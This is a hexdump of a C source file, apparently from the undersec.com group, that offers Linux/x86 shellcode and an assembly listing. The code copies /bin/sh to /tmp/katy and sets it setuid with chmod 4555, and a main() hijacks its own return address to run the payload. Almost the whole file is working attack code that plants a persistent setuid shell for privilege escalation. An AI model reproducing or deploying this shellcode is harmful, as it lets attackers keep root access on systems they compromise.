00000000  2f 2a 0d 0a 20 2a 20 20  4c 69 6e 75 78 2f 78 38  |/*.. *  Linux/x8|
00000010  36 0d 0a 20 2a 0d 0a 20  2a 20 20 2f 62 69 6e 2f  |6.. *.. *  /bin/|
00000020  63 70 20 2f 62 69 6e 2f  73 68 20 2f 74 6d 70 2f  |cp /bin/sh /tmp/|
00000030  6b 61 74 79 20 3b 20 63  68 6d 6f 64 20 34 35 35  |katy ; chmod 455|
00000040  35 20 2f 74 6d 70 2f 73  68 20 75 73 69 6e 67 20  |5 /tmp/sh using |
00000050  66 6f 72 6b 28 29 0d 0a  20 2a 2f 0d 0a 23 69 6e  |fork().. */..#in|
00000060  63 6c 75 64 65 20 22 73  74 64 69 6f 2e 68 22 0d  |clude "stdio.h".|
00000070  0a 0d 0a 0d 0a 63 68 61  72 20 73 68 65 6c 6c 63  |.....char shellc|
00000080  6f 64 65 5b 5d 20 3d 0d  0a 22 5c 78 65 62 5c 78  |ode[] =.."\xeb\x|
00000090  35 65 5c 78 35 66 5c 78  33 31 5c 78 63 30 5c 78  |5e\x5f\x31\xc0\x|
000000a0  38 38 5c 78 34 37 5c 78  30 37 5c 78 38 38 5c 78  |88\x47\x07\x88\x|
000000b0  34 37 5c 78 30 66 5c 78  38 38 5c 78 34 37 5c 78  |47\x0f\x88\x47\x|
000000c0  31 39 5c 78 38 39 5c 78  37 66 22 0d 0a 22 5c 78  |19\x89\x7f".."\x|
000000d0  31 61 5c 78 38 64 5c 78  37 37 5c 78 30 38 5c 78  |1a\x8d\x77\x08\x|
000000e0  38 39 5c 78 37 37 5c 78  31 65 5c 78 33 31 5c 78  |89\x77\x1e\x31\x|
000000f0  66 36 5c 78 38 64 5c 78  37 37 5c 78 31 30 5c 78  |f6\x8d\x77\x10\x|
00000100  38 39 5c 78 37 37 5c 78  32 32 5c 78 38 39 22 0d  |89\x77\x22\x89".|
00000110  0a 22 5c 78 34 37 5c 78  32 36 5c 78 38 39 5c 78  |."\x47\x26\x89\x|
00000120  66 62 5c 78 38 64 5c 78  34 66 5c 78 31 61 5c 78  |fb\x8d\x4f\x1a\x|
00000130  38 64 5c 78 35 37 5c 78  32 36 5c 78 33 31 5c 78  |8d\x57\x26\x31\x|
00000140  63 30 5c 78 62 30 5c 78  30 32 5c 78 63 64 5c 78  |c0\xb0\x02\xcd\x|
00000150  38 30 22 0d 0a 22 5c 78  33 31 5c 78 66 36 5c 78  |80".."\x31\xf6\x|
00000160  33 39 5c 78 63 36 5c 78  37 35 5c 78 30 36 5c 78  |39\xc6\x75\x06\x|
00000170  62 30 5c 78 30 62 5c 78  63 64 5c 78 38 30 5c 78  |b0\x0b\xcd\x80\x|
00000180  65 62 5c 78 31 64 5c 78  33 31 5c 78 64 32 5c 78  |eb\x1d\x31\xd2\x|
00000190  33 31 5c 78 63 30 22 0d  0a 22 5c 78 33 31 5c 78  |31\xc0".."\x31\x|
000001a0  64 62 5c 78 34 62 5c 78  38 64 5c 78 34 66 5c 78  |db\x4b\x8d\x4f\x|
000001b0  32 36 5c 78 62 30 5c 78  30 37 5c 78 63 64 5c 78  |26\xb0\x07\xcd\x|
000001c0  38 30 5c 78 33 31 5c 78  63 30 5c 78 38 64 5c 78  |80\x31\xc0\x8d\x|
000001d0  35 66 5c 78 31 30 5c 78  33 31 22 0d 0a 22 5c 78  |5f\x10\x31".."\x|
000001e0  63 39 5c 78 36 36 5c 78  62 39 5c 78 36 64 5c 78  |c9\x66\xb9\x6d\x|
000001f0  30 39 5c 78 62 30 5c 78  30 66 5c 78 63 64 5c 78  |09\xb0\x0f\xcd\x|
00000200  38 30 5c 78 33 31 5c 78  63 30 5c 78 34 30 5c 78  |80\x31\xc0\x40\x|
00000210  33 31 5c 78 64 62 5c 78  63 64 5c 78 38 30 22 0d  |31\xdb\xcd\x80".|
00000220  0a 22 5c 78 65 38 5c 78  39 64 5c 78 66 66 5c 78  |."\xe8\x9d\xff\x|
00000230  66 66 5c 78 66 66 2f 62  69 6e 2f 63 70 38 2f 62  |ff\xff/bin/cp8/b|
00000240  69 6e 2f 73 68 38 2f 74  6d 70 2f 6b 61 74 79 22  |in/sh8/tmp/katy"|
00000250  3b 0d 0a 0d 0a 6d 61 69  6e 28 29 20 7b 0d 0a 20  |;....main() {.. |
00000260  20 20 20 20 20 20 20 69  6e 74 20 2a 72 65 74 3b  |       int *ret;|
00000270  0d 0a 20 20 20 20 20 20  20 20 72 65 74 3d 28 69  |..        ret=(i|
00000280  6e 74 20 2a 29 26 72 65  74 20 2b 32 3b 0d 0a 20  |nt *)&ret +2;.. |
00000290  20 20 20 20 20 20 20 70  72 69 6e 74 66 28 22 53  |       printf("S|
000002a0  68 65 6c 6c 63 6f 64 65  20 6c 65 6e 67 68 74 3d  |hellcode lenght=|
000002b0  25 64 5c 6e 22 2c 73 74  72 6c 65 6e 28 73 68 65  |%d\n",strlen(she|
000002c0  6c 6c 63 6f 64 65 29 29  3b 0d 0a 20 20 20 20 20  |llcode));..     |
000002d0  20 20 20 28 2a 72 65 74  29 20 3d 20 28 69 6e 74  |   (*ret) = (int|
000002e0  29 73 68 65 6c 6c 63 6f  64 65 3b 0d 0a 7d 0d 0a  |)shellcode;..}..|
000002f0  0d 0a 2f 2a 20 43 6f 64  65 20 2a 2f 0d 0a 2f 2a  |../* Code */../*|
00000300  0d 0a 5f 5f 61 73 6d 5f  5f 28 22 0d 0a 20 20 20  |..__asm__("..   |
00000310  20 20 20 20 20 6a 6d 70  20 20 20 20 30 78 35 65  |     jmp    0x5e|
00000320  0d 0a 20 20 20 20 20 20  20 20 70 6f 70 6c 20 20  |..        popl  |
00000330  20 25 65 64 69 0d 0a 20  20 20 20 20 20 20 20 78  | %edi..        x|
00000340  6f 72 6c 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |orl   %eax,%eax.|
00000350  0a 20 20 20 20 20 20 20  20 6d 6f 76 62 20 20 20  |.        movb   |
00000360  25 61 6c 2c 30 78 37 28  25 65 64 69 29 0d 0a 20  |%al,0x7(%edi).. |
00000370  20 20 20 20 20 20 20 6d  6f 76 62 20 20 20 25 61  |       movb   %a|
00000380  6c 2c 30 78 66 28 25 65  64 69 29 0d 0a 20 20 20  |l,0xf(%edi)..   |
00000390  20 20 20 20 20 6d 6f 76  62 20 20 20 25 61 6c 2c  |     movb   %al,|
000003a0  30 78 31 39 28 25 65 64  69 29 0d 0a 20 20 20 20  |0x19(%edi)..    |
000003b0  20 20 20 20 6d 6f 76 6c  20 20 20 25 65 64 69 2c  |    movl   %edi,|
000003c0  30 78 31 61 28 25 65 64  69 29 0d 0a 20 20 20 20  |0x1a(%edi)..    |
000003d0  20 20 20 20 6c 65 61 6c  20 20 20 30 78 38 28 25  |    leal   0x8(%|
000003e0  65 64 69 29 2c 25 65 73  69 0d 0a 20 20 20 20 20  |edi),%esi..     |
000003f0  20 20 20 6d 6f 76 6c 20  20 20 25 65 73 69 2c 30  |   movl   %esi,0|
00000400  78 31 65 28 25 65 64 69  29 0d 0a 20 20 20 20 20  |x1e(%edi)..     |
00000410  20 20 20 78 6f 72 6c 20  20 20 25 65 73 69 2c 25  |   xorl   %esi,%|
00000420  65 73 69 0d 0a 20 20 20  20 20 20 20 20 6c 65 61  |esi..        lea|
00000430  6c 20 20 20 30 78 31 30  28 25 65 64 69 29 2c 25  |l   0x10(%edi),%|
00000440  65 73 69 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |esi..        mov|
00000450  6c 20 20 20 25 65 73 69  2c 30 78 32 32 28 25 65  |l   %esi,0x22(%e|
00000460  64 69 29 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |di)..        mov|
00000470  6c 20 20 20 25 65 61 78  2c 30 78 32 36 28 25 65  |l   %eax,0x26(%e|
00000480  64 69 29 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |di)..        mov|
00000490  6c 20 20 20 25 65 64 69  2c 25 65 62 78 0d 0a 20  |l   %edi,%ebx.. |
000004a0  20 20 20 20 20 20 20 6c  65 61 6c 20 20 20 30 78  |       leal   0x|
000004b0  31 61 28 25 65 64 69 29  2c 25 65 63 78 0d 0a 20  |1a(%edi),%ecx.. |
000004c0  20 20 20 20 20 20 20 6c  65 61 6c 20 20 20 30 78  |       leal   0x|
000004d0  32 36 28 25 65 64 69 29  2c 25 65 64 78 0d 0a 20  |26(%edi),%edx.. |
000004e0  20 20 20 20 20 20 20 78  6f 72 6c 20 20 20 25 65  |       xorl   %e|
000004f0  61 78 2c 25 65 61 78 0d  0a 20 20 20 20 20 20 20  |ax,%eax..       |
00000500  20 6d 6f 76 62 20 20 20  24 30 78 32 2c 25 61 6c  | movb   $0x2,%al|
00000510  0d 0a 20 20 20 20 20 20  20 20 69 6e 74 20 20 20  |..        int   |
00000520  20 24 30 78 38 30 0d 0a  20 20 20 20 20 20 20 20  | $0x80..        |
00000530  78 6f 72 6c 20 20 20 25  65 73 69 2c 25 65 73 69  |xorl   %esi,%esi|
00000540  0d 0a 20 20 20 20 20 20  20 20 63 6d 70 6c 20 20  |..        cmpl  |
00000550  20 25 65 61 78 2c 25 65  73 69 0d 0a 20 20 20 20  | %eax,%esi..    |
00000560  20 20 20 20 6a 6e 65 20  20 20 20 30 78 36 0d 0a  |    jne    0x6..|
00000570  20 20 20 20 20 20 20 20  6d 6f 76 62 20 20 20 24  |        movb   $|
00000580  30 78 62 2c 25 61 6c 0d  0a 20 20 20 20 20 20 20  |0xb,%al..       |
00000590  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  | int    $0x80.. |
000005a0  20 20 20 20 20 20 20 6a  6d 70 20 20 20 20 30 78  |       jmp    0x|
000005b0  31 64 0d 0a 20 20 20 20  20 20 20 20 78 6f 72 6c  |1d..        xorl|
000005c0  20 20 20 25 65 64 78 2c  25 65 64 78 0d 0a 20 20  |   %edx,%edx..  |
000005d0  20 20 20 20 20 20 78 6f  72 6c 20 20 20 25 65 61  |      xorl   %ea|
000005e0  78 2c 25 65 61 78 0d 0a  20 20 20 20 20 20 20 20  |x,%eax..        |
000005f0  78 6f 72 6c 20 20 20 25  65 62 78 2c 25 65 62 78  |xorl   %ebx,%ebx|
00000600  0d 0a 20 20 20 20 20 20  20 20 64 65 63 20 20 20  |..        dec   |
00000610  20 25 65 62 78 0d 0a 20  20 20 20 20 20 20 20 6c  | %ebx..        l|
00000620  65 61 6c 20 20 20 30 78  32 36 28 25 65 64 69 29  |eal   0x26(%edi)|
00000630  2c 25 65 63 78 0d 0a 20  20 20 20 20 20 20 20 6d  |,%ecx..        m|
00000640  6f 76 62 20 20 20 24 30  78 37 2c 25 61 6c 0d 0a  |ovb   $0x7,%al..|
00000650  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 24  |        int    $|
00000660  30 78 38 30 0d 0a 20 20  20 20 20 20 20 20 78 6f  |0x80..        xo|
00000670  72 6c 20 20 20 25 65 61  78 2c 25 65 61 78 0d 0a  |rl   %eax,%eax..|
00000680  20 20 20 20 20 20 20 20  6c 65 61 6c 20 20 20 30  |        leal   0|
00000690  78 31 30 28 25 65 64 69  29 2c 25 65 62 78 0d 0a  |x10(%edi),%ebx..|
000006a0  20 20 20 20 20 20 20 20  78 6f 72 6c 20 20 20 25  |        xorl   %|
000006b0  65 63 78 2c 25 65 63 78  0d 0a 20 20 20 20 20 20  |ecx,%ecx..      |
000006c0  20 20 6d 6f 76 77 20 20  20 24 30 78 39 36 64 2c  |  movw   $0x96d,|
000006d0  25 63 78 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |%cx..        mov|
000006e0  62 20 20 20 24 30 78 66  2c 25 61 6c 0d 0a 20 20  |b   $0xf,%al..  |
000006f0  20 20 20 20 20 20 69 6e  74 20 20 20 20 24 30 78  |      int    $0x|
00000700  38 30 0d 0a 20 20 20 20  20 20 20 20 78 6f 72 6c  |80..        xorl|
00000710  20 20 20 25 65 61 78 2c  25 65 61 78 0d 0a 20 20  |   %eax,%eax..  |
00000720  20 20 20 20 20 20 69 6e  63 20 20 20 20 25 65 61  |      inc    %ea|
00000730  78 0d 0a 20 20 20 20 20  20 20 20 78 6f 72 6c 20  |x..        xorl |
00000740  20 20 25 65 62 78 2c 25  65 62 78 0d 0a 20 20 20  |  %ebx,%ebx..   |
00000750  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
00000760  30 0d 0a 20 20 20 20 20  20 20 20 63 61 6c 6c 20  |0..        call |
00000770  20 20 2d 30 78 36 33 0d  0a 20 20 20 20 20 20 20  |  -0x63..       |
00000780  20 2e 61 73 63 69 69 20  5c 22 2f 62 69 6e 2f 63  | .ascii \"/bin/c|
00000790  70 38 2f 62 69 6e 2f 73  68 38 2f 74 6d 70 2f 6b  |p8/bin/sh8/tmp/k|
000007a0  61 74 79 5c 22 0d 0a 22  29 3b 0d 0a 2a 2f 0d 0a  |aty\"..");..*/..|
000007b0  0d 0a 2f 2a 0d 0a 52 61  69 53 65 20 3c 20 72 61  |../*..RaiSe < ra|
000007c0  69 73 65 40 75 6e 64 65  72 73 65 63 2e 63 6f 6d  |ise@undersec.com|
000007d0  20 3e 0d 0a 68 74 74 70  3a 2f 2f 77 77 77 2e 75  | >..http://www.u|
000007e0  6e 64 65 72 73 65 63 2e  63 6f 6d 0d 0a 2a 2f     |ndersec.com..*/|
000007ef
